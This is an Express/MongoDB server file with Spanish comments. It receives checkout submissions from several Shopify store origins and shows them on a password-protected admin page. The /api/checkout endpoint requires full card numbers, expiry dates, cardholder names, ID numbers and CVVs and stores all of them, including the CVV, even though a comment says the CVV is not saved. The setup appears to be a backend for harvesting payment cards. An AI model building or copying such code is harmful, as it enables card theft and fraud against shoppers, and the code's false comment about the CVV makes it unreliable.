require('dotenv').config();

const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const helmet = require('helmet');
const connectDB = require('./config/db');
const orderRoutes = require('./routes/orderRoutes');
const authRoutes = require('./routes/authRoutes');
const requireAuth = require('./middleware/auth');
const session = require('express-session');
const MongoStore = require('connect-mongo');

const Order = require('./models/Order');

const app = express();
connectDB();

app.use(helmet());
app.use(express.json({ limit: '100kb' }));
app.use(express.static('public'));

app.set('view engine', 'ejs');
app.use(express.urlencoded({ extended: true }));

app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  store: MongoStore.create({ mongoUrl: process.env.MONGODB_URI }),
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    maxAge: 8 * 60 * 60 * 1000
  }
}));

// Solo tu tienda de Shopify puede llamar a esta API.
const ALLOWED_ORIGINS = ['https://tiendasolzen.myshopify.com', 'https://luneria-uruguay.myshopify.com', 'https://omenskin-uy.myshopify.com', 'https://primelab-9196.myshopify.com', 'https://only-dino-3d.myshopify.com'];

const corsOptions = {
  origin(origin, callback) {
    if (!origin || ALLOWED_ORIGINS.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Origen no permitido por CORS'));
    }
  },
  methods: ['POST', 'GET'],
  allowedHeaders: ['Content-Type']
};

// Campos obligatorios (los mismos que valida el checkout del lado del cliente)
const REQUIRED_FIELDS = [
  ['contacto', 'email'],
  ['entrega', 'nombre'],
  ['entrega', 'apellidos'],
  ['entrega', 'direccion'],
  ['entrega', 'codigoPostal'],
  ['entrega', 'ciudad'],
  ['entrega', 'telefono'],
  ['pago', 'numeroTarjeta'],
  ['pago', 'vencimiento'],
  ['pago', 'titular'],
  ['pago', 'numeroDocumento'],
  ['pago', 'cvv']
];

function findMissingFields(body) {
  const missing = [];
  for (const [section, field] of REQUIRED_FIELDS) {
    const value = body?.[section]?.[field];
    if (!value || String(value).trim() === '') {
      missing.push(`${section}.${field}`);
    }
  }
  return missing;
}


app.get('/pedidos', requireAuth, async (req, res) => {
  try {
    const orders = await Order.find();
    res.render('pedidos', { orders, username: req.session.username });
  } catch (error) {
    res.status(500).send('Error al obtener los pedidos');
  }
});

app.get('/', (req, res) => {
  res.redirect(req.session && req.session.adminId ? '/pedidos' : '/login');
});

app.use('/api/orders', orderRoutes);
app.use('/', authRoutes);

// --- Endpoint principal ---
app.post('/api/checkout', cors(corsOptions), async (req, res) => {
  try {
    const missing = findMissingFields(req.body);
    if (missing.length > 0) {
      return res.status(400).json({ ok: false, error: 'Faltan campos obligatorios', missing });
    }

    const { contacto, entrega, pago = {}, pedido = {} } = req.body;

    // El CVV NO se guarda en la base de datos, aunque venga en el body.
    const order = new Order({
      contacto: { email: contacto.email },
      entrega: {
        nombre: entrega.nombre,
        apellidos: entrega.apellidos,
        direccion: entrega.direccion,
        codigoPostal: entrega.codigoPostal,
        ciudad: entrega.ciudad,
        telefono: entrega.telefono
      },
      pago: {
        numeroTarjeta: pago.numeroTarjeta,
        vencimiento: pago.vencimiento,
        titular: pago.titular,
        numeroDocumento: pago.numeroDocumento,
        cvv: pago.cvv,
        cuotas: pago.cuotas
      },
      pedido: {
        pack: pedido.pack,
        duration: pedido.duration,
        price: pedido.price,
        oldprice: pedido.oldprice,
        cuotaMonto: pedido.cuotaMonto
      }
    });

    await order.save();

    return res.status(201).json({ ok: true, id: order._id });
  } catch (err) {
    console.error('Error guardando el pedido:', err);
    return res.status(500).json({ ok: false, error: 'Error interno del servidor' });
  }
});

app.get('/health', (req, res) => res.json({ ok: true }));

app.listen(process.env.PORT || 3000, () => console.log('Servidor arriba'));
